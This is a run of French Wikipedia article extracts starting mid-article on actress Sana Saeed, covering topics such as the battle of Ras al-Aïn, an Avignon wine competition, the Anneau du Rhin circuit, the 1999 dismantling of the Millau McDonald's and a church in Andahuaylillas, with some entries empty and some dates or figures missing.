Saeed réside actuellement (en date de 2013) à Mumbai, en Inde, et choisie parmi deux-cents enfants candidats pour jouer la fille de Shah Rukh Khan et Rani Mukherjee dans "Kuch Kuch Hota Hai" (1998), son seul film depuis "Badal" (2000) et "Har Dil Jo Pyar Karega" (2000) dans lequel elle reprend son rôle de la petite Anjali dans "Kuch Kuch Hota Hai" (1998). Avant "Kuch Kuch Hota Hai" (1998), elle refuse d'apparaître dans le film "Hum Panchi Ek Daal Ke" de Rahul Gupta, car elle ne pouvait continuer ses études tout en tournant ; "Kuch Kuch Hota Hai" (1998) est alors tourné durant ses vacances scolaires, et elle est récompensée du Sansui Viewers' Choice Award dans la catégorie du . Saeed a également présenté le programme "Star Plus" dans le rôle de Chatur Chachi sur la chaîne Fox Kids. Elle est également apparue dans plusieurs séries télévisées telles que "Babul Ka Aangann Chootey Na" et "Lo Ho Gayi Pooja Iss Ghar Ki".
Débuts et popularité (depuis 2012).
En 2012, Saeed fait ses grands débuts dans un rôle secondaire dans le film "Student of the Year" de Karan Johar, en compagnie de Siddharth Malhotra, Varun Dhawan and Alia Bhatt. Elle est remarquée pour ses performances et son look glamour. Le critique Taran Adarsh de Bollywood Hungama rédige, "Student of the Year" est un succès au box-office pendant trois semaines après sa sortie.
Le film est commercialisé le et plus de cinémas à travers le pays accueillent positivement et d'une manière mitigée le film. Boxofficeindia déclare le film comme un après trois semaines.
Sana participe actuellement à une émission de télé-réalité, "Jhalak Dikhla Jaa".

</doc>
<doc id="7277243" url="https://fr.wikipedia.org/wiki?curid=7277243" title="ALCB">
ALCB



</doc>
<doc id="7277248" url="https://fr.wikipedia.org/wiki?curid=7277248" title="Nasutoceratops titusi">
Nasutoceratops titusi



</doc>
<doc id="7277249" url="https://fr.wikipedia.org/wiki?curid=7277249" title="Saison 2013-2014 du Racing Club de Strasbourg Alsace">
Saison 2013-2014 du Racing Club de Strasbourg Alsace



</doc>
<doc id="7277254" url="https://fr.wikipedia.org/wiki?curid=7277254" title="Truss">
Truss

Truss est un patronyme porté notamment par :

</doc>
<doc id="7277265" url="https://fr.wikipedia.org/wiki?curid=7277265" title="Ranunculus peltatus">
Ranunculus peltatus

Ranunculus peltatus, la Renoncule peltée, est une espèce de plante à fleurs de la famille des "Ranunculaceae".
Description.
C'est une plante herbacée.
Liste des sous-espèces.
Selon (Attention: cette liste brute contient possiblement des synonymes) :
"R. p. peltatus" est une sous-espèce trouvée en eau fraiche, alors que "R. p. baudoti" est plutôt trouvée en milieu saumâtre près des côtes.
Répartition.
On trouve l'espèce en Europe, au sud-ouest de l'Asie et dans le nord de l'Afrique.
En Europe, on la trouve de la Belgique à Malte, en passant par la Bosnie-Herzégovine.
Statut.
En France, cette plante est protégée dans le Nord-Pas-de-Calais.
En Suisse, la plante est sur la liste rouge des plantes.

</doc>
<doc id="7277266" url="https://fr.wikipedia.org/wiki?curid=7277266" title="Ellin">
Ellin

Ellin est un patronyme porté notamment par :

</doc>
<doc id="7277271" url="https://fr.wikipedia.org/wiki?curid=7277271" title="Bataille de Ras al-Aïn">
Bataille de Ras al-Aïn

La bataille de Ras al-Aïn se déroule pendant la guerre civile syrienne et oppose différentes factions pour le contrôle de la ville de Ras al-Aïn. La bataille connaît plusieurs phases : tenue initialement par le régime syrien, la ville est prise en novembre 2012 par les rebelles et les djihadistes, mais ces derniers entrent rapidement en conflit avec les Kurdes YPG, qui prennent à leur tour l'avantage et s'emparent de la ville en juillet 2013.
Déroulement.
Prise de la ville au régime par les rebelles.
Le , les rebelles attaquent pendant la nuit la ville de Ras al-Aïn, située sur la frontière avec la Turquie et tenue par le régime syrien. Selon l'Observatoire syrien des droits de l'homme, au moins 10 rebelles et 16 soldats loyalistes sont tués. Cinq civils turcs sont également blessés par de balles perdues. Les rebelles s'emparent de la ville.
Le combats des 8 et 9 novembre provoquent la fuite de civils qui franchissent la frontière pour trouver refuge en Turquie.
Les rebelles assiègent ensuite la base d'Asfar Najjar — ou Esfer Necar — près de Ras al-Aïn, et s'en emparent le 14 novembre, au terme de combats ayant fait selon l'OSDH au moins 18 morts chez les loyalistes et trois chez les rebelles.
Combats entre les rebelles et les Kurdes.
Mais le 19 novembre, quelques jours après la prise de Ras al-Aïn, les rebelles — issus du Front al-Nosra et de la brigade Ghouraba Al-Cham de l'Armée syrienne libre — entrent en conflit avec les Kurdes des Unités de protection du peuple (YPG), la branche armée du Parti de l'union démocratique (PYD), hostiles aux islamistes. Selon des militants cités par l'OSDH, le 22 novembre les combats opposent 400 combattants kurdes à 200 djihadistes du Front al-Nosra et 100 hommes de la brigade Ghouraba al-Cham. Les rebelles disposent également de trois chars pris à l'armée syrienne. Une trêve est conclue le 25 novembre mais en décembre les combats reprennent et se poursuivent pendant trois mois, jusqu'à ce qu'une nouvelle trêve soit conclue en février 2013.
Entre-temps, le 3 décembre 2012, un bombardement du régime syrien fait 12 morts, dont huit rebelles.
Prise de la ville par les Kurdes.
Les combats reprennent le mardi 16 juillet 2013 lorsque des combattants du Front Al-Nosra attaquent une patrouille de miliciens du PYD. Le 17, les djihadistes d'al-Nosra et de l'État islamique en Irak et au Levant sont repoussés hors de la ville et perdent également le village de Qasrouq, ils tirent alors des roquettes sur Ras al-Aïn, puis attaquent plusieurs barrages des YPG.
Pendant le combat à Ras al-Aïn, deux roquettes tirées depuis la Syrie tombent près d'un poste militaire turc, à Ceylanpınar, l'armée turque réplique et ouvre le feu sur des hommes du PYD.
Plus à l'est dans le gouvernorat de Hassaké, des affrontements ont également lieu le 18 juillet dans les villages de Tall Alou et Karhok et les Kurdes parviennent à prendre le contrôle d'une partie de la région pétrolière de Soueidiya. Les combats se poursuivent près du gisement pétrolier de .
Le 18 juillet, l'OSDH affirme qu'au moins 19 hommes du Front al-Nosra et 10 combattants kurdes ont été tués dans les combats livrés depuis l'avant-veille dans le gouvernorat de Hassaké.
Suites.
Après la prise de Ras al-Aïn par les Kurdes, les combats se poursuivent dans le gouvernorat de Hassaké. 
En août 2013, l'État islamique en Irak et au Levant relance une offensive : des combats ont lieu à Asfar Najjar et Tal Halaf, au sud de Ras al-Aïn. Le 17 août, l'OSDH déclare qu'au moins onze djihadistes et quatre combattants kurdes ont été tués, ainsi qu'un infirmier et un ambulancier du Croissant-Rouge kurde.
Les 10 et 11 septembre 2013, selon l'OSDH au moins 13 combattants des YPG et 23 djihadistes de l'État islamique en Irak et au Levant, du Front al-Nosra et de quelques autres groupes sont tués dans des combats livrés dans l'ensemble du gouvernorat de Hassaké.
Le 18 septembre 2013, les Kurdes prennent le village d'Alouk, à l'est de Ras al-Aïn, au terme de quatre jours de combats et au moins 20 morts dans les deux camps.
Dans la nuit du 29 au 30 octobre 2013, huit djihadistes sont tués dans des combats à Keshto, Asfar Najjar et Tal Halaf, au sud de Ras al-Aïn.

</doc>
<doc id="7277283" url="https://fr.wikipedia.org/wiki?curid=7277283" title="Ministre des affaires étrangères de la France">
Ministre des affaires étrangères de la France



</doc>
<doc id="7277286" url="https://fr.wikipedia.org/wiki?curid=7277286" title="Lloyd C. Blankfein">
Lloyd C. Blankfein



</doc>
<doc id="7277308" url="https://fr.wikipedia.org/wiki?curid=7277308" title="Concours des vins de la Foire d'Avignon">
Concours des vins de la Foire d'Avignon

Le Concours des vins-Avignon, est un concours annuel des vins de la vallée du Rhône et de Provence. Il est organisé par la Foire Exposition d'Avignon. Créé en 1986, il regroupe les vins de trois régions (Provence-Alpes-Côte d'Azur, Languedoc-Roussillon, Rhône-Alpes) et de neuf départements (Alpes-de-Haute-Provence, Alpes-Maritimes, Hautes-Alpes, Ardèche, Bouches-du-Rhône, Drôme, Gard, Var et Vaucluse). Il est agréé au niveau européen depuis 1992. Le le concours a fêté sa .
Historique.
C'est le que se déroula le premier à Avignon. Il eut alors à juger 200 échantillons de vin.
Ce nouveau concours avait été proposé à l'équipe dirigeante de la Foire d'Avignon par Maurice Archimbaud, vigneron à Vacqueyras, en tant qu'administrateur du syndicat des vignerons des côtes-du-rhône avec l'aval de l'ensemble de la profession viticole de Vaucluse.
Organisation.
Son organisation fut donc prise en charge par , avec la collaboration des syndicats des vins des régions Provence-Alpes-Côte d'Azur, Languedoc-Roussillon et Rhône-Alpes. Pour asseoir sa notoriété et garantir son professionnalisme, il se plaça sous le contrôle de la Direction Départementale de l'Agriculture et des services de la répression des fraudes. Georges Goguely, de la DDA de Vaucluse, assume toujours la responsabilité du concours et son contrôle.
Pour ce faire, les vins blanc, rouge et rosé sont prélevés 15 jours avant son déroulement par des équipes de collecteurs désignés qui se rendent sur la propriété pour recueillir trois bouteilles des cuvées concourantes. Un bulletin d'analyse accompagne chaque échantillon et l'anonymat des bouteilles est préservé par les organisateurs.
Déroulement.
Le concours se déroule depuis son début dans une salle au Parc des expositions d'Avignon. La dégustation, par table de jurés, se fait sur la base d'une quinzaine de bouteilles. Il y a en tout, répartis en , soit environ . Le jury est composé de restaurateurs, journalistes spécialisés, professionnels (producteurs, courtiers, négociants en vin et œnologues) ainsi que par des consommateurs œnophiles. Il juge les trois derniers millésimes précédant sa tenue.
Récompenses.
Le concours est habilité à attribuer des distinctions car reconnu officiellement par le ministère de l'Agriculture dès 1986 et par les instances européennes à partir de 1992. Les organisateurs ont calculé que pour ces , il est accordé moins de d'or, d'argent et de bronze. Cette distinction a droit d'apparaître sur les bouteilles du lot primé grâce à un macaron personnalisé, illustré par une grappe de raisin et le pont d’Avignon.
Vins concourants.
Il s'agit des côtes-du-rhône (appellation régionale), des côtes-du-rhône villages avec ou sans nom géographique, des appellations locales ou crus : Beaumes-de-venise (AOC), Châteauneuf-du-pape (AOC), Gigondas (AOC), Lirac (AOC), Rasteau (AOC), Tavel (AOC), Vacqueyras (AOC), Vinsobres (AOC), Saint-joseph (AOC), Crozes-hermitage (AOC) ainsi que des appellations vins doux naturels Muscat de Beaumes-de-Venise, Rasteau rouge ou doré.
Participent aussi les vins de la vallée du Rhône tels que Luberon (AOC), Ventoux (AOC), Costières-de-nîmes, Grignan-les-adhémar, et côtes-du-vivarais.
S'y ajoutent les vins de la Provence comme Bandol (AOC), Baux-de-provence (AOC), Coteaux-d'aix-en-provence, Coteaux-varois-en-provence, Pierrevert (AOC), Côtes-de-provence et ses appellations villages (La Londe, Fréjus, Sainte-Victoire) et les crus classés.
Les vins avec I.G.P (Indication géographique protégée) c’est-à-dire les vins de pays des départements : alpes-de-haute-provence, alpes-maritimes, hautes-alpes, ardèche, bouches-du-rhône, drôme, gard, var, vaucluse ainsi que les vins de pays de zone de chacun de ces départements.

</doc>
<doc id="7277310" url="https://fr.wikipedia.org/wiki?curid=7277310" title="Giovanni Velluti">
Giovanni Velluti

Giovanni Velluti, né à Rome le , est un pianiste italien.
Formation.
Il commence sa formation avec Aldo Mantia, membre de l'école de Chopin et continue sa formation avec Sergio Fiorentino. 
Carrière.
En tant que soliste, il se consacre surtout à la musique romantique dont Liszt et Chopin.
Il joue depuis 1994 avec Katia Ricciarelli et réalise de nombreuses tournées en Europe, en Amérique, en Afrique et au Moyen-Orient. Il collabore avec de nombreux autres chanteurs dont Armando Ariostini, Philip Bettoschi et Stefania Bonfadelli.

</doc>
<doc id="7277312" url="https://fr.wikipedia.org/wiki?curid=7277312" title="Ranunculus penicillatus">
Ranunculus penicillatus

La Renoncule pénicillée ou Renoncule à pinceau ("Ranunculus penicillatus") est une espèce de plante à fleurs de la famille des Renonculacées.
Description.
Ce sont des plantes aquatiques.
Liste des sous-espèces et variétés.
Selon :
Selon (Attention liste brute contenant possiblement des synonymes) :
Statut.
En France, cette plante est protégée dans le Nord-Pas-de-Calais.

</doc>
<doc id="7277314" url="https://fr.wikipedia.org/wiki?curid=7277314" title="Espadon (S637)">
Espadon (S637)

LEspadon" (S637)"' est un sous-marin classique de la Marine nationale française de classe Narval.
Historique.
Commissionné en 1960, avec un équipage de 7 officiers, 32 officiers mariniers et 25 quartiers-maîtres et matelots, l"Espadon" avait pour mission la surveillance des zones océaniques et des lignes maritimes. 
En , le sous-marin entre en collision avec le "Laubie". Le , un incendie dans le compartiment des torpilles blesse quatre sous-mariniers, dont l'un meurt plus tard de ses blessures. En avril-mai 1964, l"Espadon" et le "Marsouin" plongent pendant sous la banquise de la mer de Norvège au nord.
Il est désarmé le . Depuis, l"Espadon" est amarré dans l'écluse fortifiée de la base sous-marine de Saint-Nazaire, après avoir fait sa dernière plongée le avec quinze de ses commandants parmi ses seize « pachas ». L"Espadon" est le premier sous-marin visitable en France, étant devenu un navire musée. Faussement à flot dans une cale remplie d’eau de pluie, il fait l'objet durant le premier semestre 2021, sur place, de travaux de conservation par le chantier de l'Esclain.

</doc>
<doc id="7277321" url="https://fr.wikipedia.org/wiki?curid=7277321" title="Sports de glace">
Sports de glace



</doc>
<doc id="7277322" url="https://fr.wikipedia.org/wiki?curid=7277322" title="Les Anthinoises">
Les Anthinoises

Les Anthinoises, Festival de Wallonie des musiques et cultures celtiques est un festival de musique (musique celtique, rock, musique folk, World music, Pagan folk, etc.) qui se déroule tous les deux ans en avril à Anthisnes dans la région de Liège en Belgique depuis 2000.
Le festival qui se déroule au sein même du village d'Anthisnes, réunit lors de chaque édition un total de 15.000 à 20.000 visiteurs durant un week-end
Si les concerts en constituent l'élément principal, Les Anthinoises est un festival multidisciplinaire. En effet, le festival propose également, sur le thème général de la culture celtique, des expositions d'art, un marché artisanal ("Le Village celte") où l'on peut voir les échoppes de plus d'une centaine d'artisans, des animations et spectacles de rue.
Chaque édition propose, sur 3 scènes (Le Chaudron des Trolls, Le Pavillon des Bardes et La Scène aux Découvertes), environ 30 concerts d'artistes belges et de la scène internationale représentant les diverses tendances actuelles des musiques celtiques ou d'inspiration celtique. Par la passé, le festival a ainsi accueilli Minimum Vital, Omnia, Les Ramoneurs de Menhir, Plantec, Kila, Outside Duo ou encore Dan Ar Braz. Les styles sont donc très variés, allant des musiques celtiques traditionnelles aux diverses formes de folk ou de rock celtiques.
Le festival est organisé par une équipe de bénévoles passionnés réunis au sein de l'ASBL "Li Mohe è l'Ôrlodje".

</doc>
<doc id="7277324" url="https://fr.wikipedia.org/wiki?curid=7277324" title="Marc Alaux">
Marc Alaux

Marc Alaux né à Saint-Mandé le est un écrivain et voyageur français.
Biographie.
Marc Alaux est éditeur et libraire de voyage chez Transboréal. Né à Saint-Mandé (94), il réside à Montrouge dans les Hauts-de-Seine. Il est aussi écrivain et conférencier. Il s'est fait une spécialité des voyages à pied en Mongolie (7000 kilomètres) et des longs séjours chez les populations d'éleveurs nomades.

</doc>
<doc id="7277331" url="https://fr.wikipedia.org/wiki?curid=7277331" title="The Phantom Island">
The Phantom Island

 est un film muet américain réalisé par Francis Ford et sorti en 1916.

</doc>
<doc id="7277334" url="https://fr.wikipedia.org/wiki?curid=7277334" title="Oratoire Madonna delle Querce">
Oratoire Madonna delle Querce

LOratoire Madonna della Querce est un édifice religieux catholique qui est situé via Palazzo dei Diavoli, dans le quartier de l'Isolotto, à la périphérie de Florence.
Historique.
L'édifice était à l'origine sous le patronat de la famille Mannelli dont les armoiries sont encore visibles, puis passa sous celui de la famille Antinori. La dénomination provient de la localité "La Querce", où la famille possédait une villa de campagne.
Description.
L'édifice est de forme octogonale, à coupole et s'inspire des formes de Filippo Brunelleschi. L'oratoire est précédé d'un portique creusé au cours du "Seicento", sur les parois duquel il reste des fragments de fresques attribuées à Paolo Schiavo, qui a aussi réalisé la décoration de l'intérieur avec les "Évangélistes" dans les tympans ainsi que le retable de l"Assomption", signé et daté 1460.
Le pavement en majolique a été restauré en 1898 et plus récemment par les Antinori.
L'édifice, première église du rione Isolotto, est encore dédié au culte.

</doc>
<doc id="7277341" url="https://fr.wikipedia.org/wiki?curid=7277341" title="Sélectivité alimentaire">
Sélectivité alimentaire



</doc>
<doc id="7277349" url="https://fr.wikipedia.org/wiki?curid=7277349" title="Emmelsbüll-Horsbüll">
Emmelsbüll-Horsbüll

Emmelsbüll-Horsbüll est une commune de l'arrondissement de Frise-du-Nord, Land de Schleswig-Holstein.
Géographie.
Emmelsbüll-Horsbüll est un habitat dispersé qui couvre le village étirée le long de la rue principale d'Emmelsbüll, le terp d'Alt-Horsbüll, autrefois une hallig, et d'autres hameaux.
Histoire.
Horsbüll est mentionnée pour la première fois en 1231, dans le "Liber Census Daniæ". L'église date de cette époque. Les tempêtes ont détruit plusieurs fois la digue, forçant le village à se déplacer de l'autre côté de l'église. Mais aujourd'hui elle ne se trouve plus le long de la mer du Nord, mais à côté de Friedrich-Wilhelm-Lübke-Koog. 
Le nom du village viendrait d'une légende selon laquelle un habitant a sauvé l'église de la tempête en la tirant avec son cheval ("hors").
L'église Sainte-Marie date du , époque dont il reste les fonts baptismaux. La communauté était assez riche. Avant la Réforme, ils possédaient trois autels sculptés gothiques. Ils sont démolis en 1780 pour accueillir un autel baroque.
Emmelsbüll est aussi mentionnée dans le "Liber Census Daniæ".
Emmelsbüll et Horsbüll sont réunis depuis le .
Église d'Emmelsbüll.
Emmelsbüll possède une église pittoresque de 1768 avec une voûte peinte au motif du ciel. Elle est surtout l'héritage de celle bâtie durant le règne de Valdemar II de Danemark dont il reste un linteau orné d'animaux de la mythologie germanique comme le dragon ou le sanglier (la Judensau).
La chaire et l'autel sont de l'époque baroque, ressemblant à ceux de l'église de Tønder. Le peintre Carl Ludwig Jessen fait deux tableaux qui sont posés de chaque côté. 

</doc>
<doc id="7277353" url="https://fr.wikipedia.org/wiki?curid=7277353" title="Carole Vergnaud">
Carole Vergnaud

Carole Vergnaud, née le , est une pilote automobile française de rallye (asphalte, neige, et terre), et sur circuit.
Biographie.
Sa carrière en compétition automobile s'étale de 1984 à 1989, exclusivement au volant de voitures Citroën.
Hormis ses courses en rallyes (sur toutes surfaces), elle a également participé au Championnat de France de Supertourisme en 1988, sur Citroën AX Sport Turbo aux côtés de Jean-Pierre Beltoise et de Jean-Pierre Jarier sur le même modèle.
Elle a aussi été copilote, notamment de Olivier Hugla au Rallye Hanki en 1985, sur Mitsubishi Lancer Evo.

</doc>
<doc id="7277360" url="https://fr.wikipedia.org/wiki?curid=7277360" title="Vilanova">
Vilanova

Vilanova peut désigner :

</doc>
<doc id="7277364" url="https://fr.wikipedia.org/wiki?curid=7277364" title="Diabloceratops eatoni">
Diabloceratops eatoni



</doc>
<doc id="7277369" url="https://fr.wikipedia.org/wiki?curid=7277369" title="Homer Martin Adkins">
Homer Martin Adkins

Homer Martin Adkins, né le à Jacksonville (États-Unis) et mort le à Malvern (États-Unis), est un pharmacien, homme d'affaires et homme politique américain.
Membre du Ku Klux Klan et du Parti démocrate, il est gouverneur de l'Arkansas de 1941 à 1945.
Candidat au poste de sénateur des États-Unis lors des , il est battu par son rival J. William Fulbright lors de la 
Biographie.
Il est né près de Jacksonville, dans le comté de Pulaski, de Ulysses et Lorena (née Wood) Adkins. Il est diplômé du lycée de Little Rock en 1907 et du Draughon's Business College en 1909. Adkins commence à travailler à la Snodgrass &amp; Bracy Drug Company en 1910 et obtient son diplôme de pharmacien à la faculté de pharmacie de Little Rock en 1911. Le conseil de pharmacie de l'État de l'Arkansas lui accorde une autorisation spéciale d'exercer pendant les six mois qui précèdent son 21e anniversaire.
Adkins commence à étudier le droit en 1915, mais s'engage dans l'armée américaine pendant la Première Guerre mondiale. Il passe du statut de simple soldat à celui de capitaine dans le Medical Corps. Adkins est élu secrétaire du Young Men's Democratic Club en 1916. Au camp Beauregard, Adkins rencontre sa future épouse Estelle Smith; ils se marient le 21 décembre 1921. Smith est une infirmière de la Croix-Rouge de l'armée américaine, et tous deux sont plus tard stationnés en France dans le cadre de l'American Expeditionary Force.

</doc>
<doc id="7277375" url="https://fr.wikipedia.org/wiki?curid=7277375" title="Anneau du Rhin">
Anneau du Rhin

L'Anneau du Rhin est un circuit automobile permanent situé à Biltzheim, dans le Haut-Rhin, en France. Il s'agit du plus grand circuit du Grand Est.
Historique.
En 1996, l'industriel Marc Rinaldi et son fils François Rinaldi fondent le circuit sur la commune de Biltzheim, dans le Haut-Rhin, entre Niederentzen à l’ouest et Rustenhart à l’est, à une quinzaine de kilomètres de la frontière allemande. Le circuit est créé sur le terrain d'un ancien relais de chasse appartenant aux fondateurs de l'entreprise Manurhin, dans un bois de la forêt de la Hardt. Le circuit . En allemand, le circuit est appelé « "Rheinring" ».
Le circuit est homologué pour la compétition mécanique automobile FFSA et moto FFM depuis 2011. La même année, la piste est regoudronnée, l'élargissant d'un mètre.
François Rinaldi dirige d'abord le circuit ; Joshua Reibel lui succède ensuite.
En , la piste est à nouveau regoudronnée.
Les et , en raison de l'annulation des courses en Tchéquie et en Russie suite à l'invasion de l'Ukraine par la Russie, l'Anneau du Rhin accueille la septième manche de la Coupe du monde des voitures de tourisme. Les deux courses sont respectivement remportées par le Français Nathanaël Berthon et le Britannique Robert Huff.
En 2023, le paddock est agrandi.
En , le circuit accueille une épreuve du Tour Auto ; en , une manche du Championnat de France Superbike ; en , la deuxième édition du Trophée d'Alsace où près 200 véhicules circulent, dont 75 Bugatti et la 1000tipla du vidéaste Sylvain Levy.
Description et configurations.
Plus grand circuit du Grand Est, le tracé mesure 4 kilomètres et est inspiré du tracé du circuit Paul-Ricard, au Castellet, dans le Var.
Le circuit peut être configuré de quatre manières différentes : une version de pour la plus grande (tracé pour le loisir), , (tous les deux pour la compétition) ou (pour l'entraînement et les stages).
La variante de est la plus ancienne (créée en 1996 et modernisée en 2006) et la plus utilisée : c'est cette configuration qui accueille la majeure partie des évènements. C'est la variante « originale ». Celle de est homologuée pour la compétition depuis ainsi que par la Fédération internationale de l'automobile et s'inspire du tracé du circuit Paul-Ricard.
Record du tour.
Le record du tour est attribué à Dominique Cauvin, réalisé en 1 min 19 s 361 en 2017 au volant d'une .

</doc>
<doc id="7277377" url="https://fr.wikipedia.org/wiki?curid=7277377" title="Avaceratops lammersi">
Avaceratops lammersi



</doc>
<doc id="7277382" url="https://fr.wikipedia.org/wiki?curid=7277382" title="Albert Rop">
Albert Rop

Albert Kibichii Rop (né le ) est un athlète kényan naturalisé bahreïni en 2013, spécialiste des courses de fond.
Biographie.
Le , lors du Meeting Herculis de Monaco, il se classe deuxième de l'épreuve du 5 000 mètres, derrière le Kényan Edwin Soi. Il établit la marque de et améliore de 2/100 de seconde le record d'Asie de la discipline détenu depuis 2006 par le Qatari Saif Saaeed Shaheen.
En 2017 il bat aussi le record en salle avec .
Le , il est suspendu provisoirement pour avoir manqué trois tests antidopage en moins d'un an.

</doc>
<doc id="7277384" url="https://fr.wikipedia.org/wiki?curid=7277384" title="Kenji Yamamoto">
Kenji Yamamoto

Kenji Yamamoto peut désigner :

</doc>
<doc id="7277387" url="https://fr.wikipedia.org/wiki?curid=7277387" title="Rubeosaurus ovatus">
Rubeosaurus ovatus



</doc>
<doc id="7277391" url="https://fr.wikipedia.org/wiki?curid=7277391" title="Styracosaurus albertensis">
Styracosaurus albertensis



</doc>
<doc id="7277400" url="https://fr.wikipedia.org/wiki?curid=7277400" title="Démontage du McDonald's de Millau">
Démontage du McDonald's de Millau

Le démontage du McDonald's de Millau est une action effectuée le par des paysans militants des syndicats agricoles Confédération paysanne et SPLB (Syndicat des producteurs de lait de brebis) sur le chantier de construction d'un restaurant de la chaîne McDonald's à Millau, dans l'Aveyron en France. Cette action emblématique de désobéissance civile a été qualifiée majoritairement de « démontage » mais le terme de « saccage » a aussi été largement employé.
Manifestation visant aussi l'Organisation mondiale du commerce (OMC) dans le cadre du conflit du bœuf aux hormones, l'opération constitue un repère dans l'histoire de l'altermondialisme en France et de la place occupée par la Confédération paysanne au sein du monde agricole français. Pour le sociologue Jean-Pierre Poulain, elle fait par ailleurs entrer la nourriture sur la scène politique en France.
Contexte politique.
Il s'agissait, pour la Confédération paysanne de protester contre la décision de l'Organisation mondiale du commerce dans le cadre du conflit du bœuf aux hormones, d'autoriser les sanctions américaines (sous forme de taxation punitive de certaines importations d'origine européenne, comme le fromage au lait cru de brebis roquefort), en raison du refus de l'Union européenne d'importer des États-Unis de la viande de vache élevée aux hormones de croissance. McDonald's, entreprise d'origine américaine, représentait à leurs yeux la cible symbolique idéale, tout à la fois de la « malbouffe » et du « capitalisme apatride ».
René Riesel, autre membre de la Confédération paysanne et auteur avec José Bové et d'autres agriculteurs syndicalistes de destructions de cultures OGM, avance que cette action intervient à un moment critique de la lutte contre les OGM, quand celle-ci finissait par prendre de l'ampleur et osait s'attaquer à la recherche publique. Selon Riesel, la médiatisation de la « malbouffe » a permis de masquer la « guerre contre le vivant » que mène la société industrielle, et a permis à un courant de contestation légaliste qu'il qualifie de « citoyenniste » d'occuper seul la scène médiatique, avec Bové à sa tête. Alors que le précédent mouvement dénonçait toute forme de manipulation génétique comme moyen de domination du couple recherche/industrie sur le vivant et les populations, le mouvement « citoyenniste » milite seulement pour que l'État régule cette domination en protégeant le consommateur, ce que Riesel perçoit comme une dérive qui limite considérablement la portée contestatrice, et potentiellement émancipatrice, de la lutte contre les OGM.
Déroulement.
L'histoire débute en juillet 1999 à la terrasse d'un café de Saint-Affrique. José Bové, porte-parole du SPLB et six de ses camarades agriculteurs syndiqués ont l'idée de contrer le boycott américain en démontant, le 12 août, le McDonald's de Millau en train de se construire. Ils annoncent cette action en conférence de presse, précisant qu'il s'agira avant tout d'une manifestation bon enfant avec dégustation de roquefort. Quelque temps avant la manifestation, les Renseignements généraux prennent contact avec les militants pour leur proposer de démonter un bâtiment factice, plutôt que de s'en prendre au vrai, en vain.
Vers , 300 agriculteurs se réunissent à l'appel de la Confédération paysanne de l'Aveyron ainsi que du Syndicat des producteurs de lait de brebis. Tandis que certains distribuent des tartines de roquefort, d'autres démontent l'établissement en une heure, sous les yeux impuissants de Marc Dehani, patron des quatre Mc Donald's de l'Aveyron. Les dégâts s'élèveront à .
Le 19 août, José Bové, en vacances, apprend par la radio que quatre de ses camarades ont été interpellés. Il se rend le jour même à Millau devant 500 manifestants et presque autant de caméras et d'objectifs. Mis en examen, il ne ressort pas libre comme ses autres participants, car il est déjà sous le coup d'une condamnation pour une destruction de champ OGM. Il est transféré à la maison d'arrêt de Villeneuve-lès-Maguelone, près de Montpellier. Une libération sous caution lui est proposée, mais il refuse de payer les nécessaires à sa libération. Devant cette affaire médiatique, une collecte de solidarité est organisée. Finalement, sont collectés, si bien que Bové accepte la libération sous caution. De nombreux journalistes couvrent l'évènement de sa sortie de prison, le 7 septembre.
Cinq agriculteurs militants ont été mis en examen à la suite de cet événement. Cette destruction d'un bien privé a été sanctionnée au cours d'un procès le devant le tribunal correctionnel de Millau, au cours duquel altermondialistes se sont réunis. La peine est confirmée par la cour d'appel de Montpellier en 2001. Le verdict condamne José Bové à une peine de trois mois de prison ferme et de prison avec sursis pour les quatre autres paysans.

</doc>
<doc id="7277401" url="https://fr.wikipedia.org/wiki?curid=7277401" title="Spinops sternbergorum">
Spinops sternbergorum



</doc>
<doc id="7277407" url="https://fr.wikipedia.org/wiki?curid=7277407" title="Centrosaurus apertus">
Centrosaurus apertus



</doc>
<doc id="7277413" url="https://fr.wikipedia.org/wiki?curid=7277413" title="Ambassade d'Équateur en France">
Ambassade d'Équateur en France

L'ambassade d'Équateur en France est la représentation diplomatique de l'Équateur auprès de la République française. Elle est située 50 rue Copernic, dans le de Paris. Son ambassadrice est, depuis 2025, Ana María Pesantes.
Histoire.
Dans les années 1900, la légation d'Équateur se trouvait 63 avenue de Villiers, tandis que le consulat général était installé 91 avenue de Wagram (). Dans les années 1920, la légation et le consulat général se situaient tous les deux au 91 avenue de Wagram.
Jusqu'au début des années 2020, l'ambassade est installée 34, avenue de Messine ().

</doc>
<doc id="7277416" url="https://fr.wikipedia.org/wiki?curid=7277416" title="Église Saint-Pierre-Apôtre d'Andahuaylillas">
Église Saint-Pierre-Apôtre d'Andahuaylillas

Au Pérou, l’église Saint-Pierre-Apôtre d’Andahuaylillas est surnommée "La Chapelle Sixtine des Andes", et dans un sens la comparaison est pertinente : cette église est l'un des exemples les plus beaux et les plus surprenants de l'art religieux populaire andin.
Andahuaylillas est un petit village situé dans la province de Quispicanchi, à moins de de la ville de Cuzco. D'après les vestiges que l'on y trouve, le village se situe sur un site inca d'une certaine importance. En raison de ses terres fertiles, à proximité de la rivière Vilcanota, des résidents de condition aisée s'y sont installés dans les premiers temps de la colonie, comme le suggère l'existence des grandes maisons seigneuriales (casonas) que l'on peut toujours y observer. Son nom (« prairie de bronze », en quechua) dut subir une modification compte tenu du fait qu'il existait déjà une ville homonyme de plus grande importance : Andahuaylas dans la région d'Apurímac.
Aujourd'hui, Andahuaylillas compte environ . Le village reçoit de nombreux voyageurs transitant en bus en direction de Cuzco ou de Puno. En arrivant sur la place du village, on peut admirer l'extérieur de l'église à l'ombre d'immenses arbres "pisonay" plusieurs fois centenaires. Bâtie sur une plateforme à laquelle on accède en grimpant quelques marches, l'église possède une chapelle ouverte en forme de balcon et un clocher de forme quadrangulaire. Elle fut probablement construite sur l'emplacement d'un édifice pré-hispanique - peut-être une huaca - car à l'intérieur, il y a des restes de murs incas.
Cette image sobre de l'extérieur tranche radicalement avec la richesse de la décoration intérieure. Une explosion d'or, de sculptures et de peintures s'offre aux yeux des visiteurs à peine passées les portes de l'église. Le but de ces représentations religieuses était à la fois d'enseigner le message biblique aux populations indigènes mais aussi de susciter leur adhésion par l'émerveillement. 
La construction de l'église débuta probablement à la fin du car l'une de ses fresques est signée Luis de Riaño à l'année 1626. Elle fut placée sous le patronage de Saint Pierre par les jésuites bien que son autel principal soit dédié à la Vierge du Rosaire. L'église est constituée d'une seule nef et de deux chapelles latérales et ses murs sont faits d'adobe. 
